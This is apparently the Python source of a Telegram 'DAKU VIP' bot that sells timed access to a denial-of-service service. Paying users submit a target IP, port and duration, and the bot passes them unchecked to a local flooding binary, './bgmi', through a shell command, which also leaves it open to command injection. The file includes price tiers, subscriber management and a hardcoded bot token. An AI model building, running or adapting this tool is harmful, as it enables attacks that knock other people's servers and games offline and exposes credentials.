import asyncio
import datetime
import json
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Configuration constants
TELEGRAM_BOT_TOKEN = '7960283920:AAHul_6tNoU3sCL2taqTrdOYWTNOpxJu1wY'  # Replace with your Telegram Bot Token
ADMIN_USER_ID = 1944182800  # Replace with your Telegram User ID
USERS_FILE = 'users.json'
USERS_CPP_FILE = 'users.cpp'
RESTRICTED_PORTS = {"17500", "20000", "20001", "20002", "20003"}
ATTACK_COOLDOWN_SECONDS = 300  # 5 minutes cooldown
MAX_ATTACK_DURATION = 200  # Max attack duration in seconds

# Global state
attack_in_progress = False
attack_end_time = None
last_attack_times = {}
users = {}

# Load and save users
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

users = load_users()

# Check if a user is approved
def is_user_approved(user_id):
    user_id = str(user_id)
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d')
        if expiration_date > datetime.datetime.now():
            return True
        else:
            del users[user_id]
            save_users(users)
    return False

def get_remaining_days(user_id):
    user_id = str(user_id)
    if user_id in users:
        expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d')
        remaining_days = (expiration_date - datetime.datetime.now()).days
        return remaining_days
    return None

# Command handlers
async def start(update: Update, context: CallbackContext):
    user_name = update.effective_user.first_name
    chat_id = update.effective_chat.id
    message = (
        f"*🔥 Welcome {user_name} to the 🌚DAKU VIP bot🔥*\n\n"
        "*Type /help for available commands.\n\n*"
        "*⚠️CONTACT THE OWNER FOR PURCHASE--> @DAKUBhaiZz❄️*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⭐Available Commands:🌟*\n\n"
        "/attack --> Launch an attack 🔫\n\n"
        "/rule --> View rules 📃\n\n"
        "/admincommand --> Admin commands 👨\n\n"
        "/plane --> View pricing details 💸\n\n"
        "/myinfo --> View your account information 👤\n"
        "⚠️CONTACT THE OWNER--> @DAKUBhaiZz❄️"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    user_name = update.effective_user.username or "Unknown User"
    is_approved = is_user_approved(user_id)

    if is_approved:
        remaining_days = get_remaining_days(user_id)
        message = (
            f"*👤 Your Information:*\n\n"
            f"*👨Username:* {user_name}\n"
            f"*📃User ID:* {user_id}\n"
            f"*💳Status:* Approved ✅\n"
            f"*🌟Days Remaining:* {remaining_days} days\n"
        )
    else:
        message = (
            f"*👤 Your Information:*\n\n"
            f"*Username:* {user_name}\n"
            f"*User ID:* {user_id}\n"
            f"*Status:* Not Approved ❌\n\n"
            "⚠️CONTACT THE OWNER--> @DAKUBhaiZz❄️"
        )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def rule(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⚠️ Rules:*\n\n\n"
        "1.🚨 Ek Time Pe Ek Hi Attack Lage Ga.\n\n"
        "2.🚨 200 Second Tak Hi Attack Lga Skte Ho."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def plane(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*⏰ Attack Time: 200 (S)*\n\n"
        "*Price💸*\n\n\n"
        "😑1 Day = 85 Rs\n"
        "❤️3 Days = 225 Rs\n"
        "😎1 Week = 400 Rs\n"
        "😈1 Month = 650 Rs\n"
        "🤑Lifetime = 800 Rs\n\n"
        "⚠️CONTACT THE ADMIN--> @DAKUBhaiZz❄️"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Admin Command Overview
async def admin_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    message = (
        "*🔒 Admin Commands:*\n\n"
        "/daku add <user_id> <expiration_date (YYYY-MM-DD)> - Add a user with specified expiration date.\n\n"
        "/broadcast <message> - Send a message to all approved users.\n\n"
        "/download - Download the `users.json` and `users.cpp` files."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, username, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))  # Set attack end time

    await context.bot.send_message(ADMIN_USER_ID, text=(
        f"*⚔️ Attack Started by {username}! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
    ), parse_mode='Markdown')

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} 100",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our DAKU Bot!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "Unknown User"
    args = context.args

    if not is_user_approved(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You need to be approved to use this bot or your access has expired.*\n⚠️CONTACT THE OWNER--> @DAKUBhaiZz❄️", parse_mode='Markdown')
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        if remaining_time > 0:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Another attack is already in progress.*\n*⏳ Remaining time: {int(remaining_time)} seconds.*", parse_mode='Markdown')
            return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if port in RESTRICTED_PORTS:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Attack on port {port} is not allowed.*", parse_mode='Markdown')
        return

    current_time = datetime.datetime.now()
    
    # Check cooldown for the port
    if port in last_attack_times:
        last_attack_time = last_attack_times[port]
        elapsed_time = (current_time - last_attack_time).total_seconds()
        if elapsed_time < ATTACK_COOLDOWN_SECONDS:
            remaining_cooldown = ATTACK_COOLDOWN_SECONDS - elapsed_time
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must wait {int(remaining_cooldown)} seconds before attacking this port again.*", parse_mode='Markdown')
            return

    # Validate duration
    try:
        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ The maximum attack duration is {MAX_ATTACK_DURATION} seconds.*", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be a number.*", parse_mode='Markdown')
        return

    # Record the last attack time
    last_attack_times[port] = current_time

    # Run the attack
    await run_attack(chat_id, ip, port, duration, username, context)

# Admin commands
async def add_user(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /daku add <user_id> <expiration_date (YYYY-MM-DD)>*", parse_mode='Markdown')
        return

    user_id, expiration_date = context.args

    try:
        datetime.datetime.strptime(expiration_date, '%Y-%m-%d')
        users[user_id] = expiration_date
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {user_id} added with expiration date {expiration_date}.*", parse_mode='Markdown')
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid expiration date format. Please use YYYY-MM-DD.*", parse_mode='Markdown')

async def broadcast(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    message = ' '.join(context.args)
    if not message:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Please provide a message to broadcast.*", parse_mode='Markdown')
        return

    for user_id in users.keys():
        await context.bot.send_message(chat_id=user_id, text=message, parse_mode='Markdown')

    await context.bot.send_message(chat_id=chat_id, text="*✅ Message broadcasted to all users.*", parse_mode='Markdown')

async def download_files(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return

    await context.bot.send_document(chat_id=chat_id, document=open(USERS_FILE, 'rb'))
    await context.bot.send_document(chat_id=chat_id, document=open(USERS_CPP_FILE, 'rb'))

# Main function to run the bot
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("plane", plane))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("admincommand", admin_command))
    application.add_handler(CommandHandler("daku", admin_command))  # Dummy command for daku add
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("download", download_files))
    application.add_handler(CommandHandler("add", add_user))

    # Run the bot
    application.run_polling()

if __name__ == "__main__":
    main()
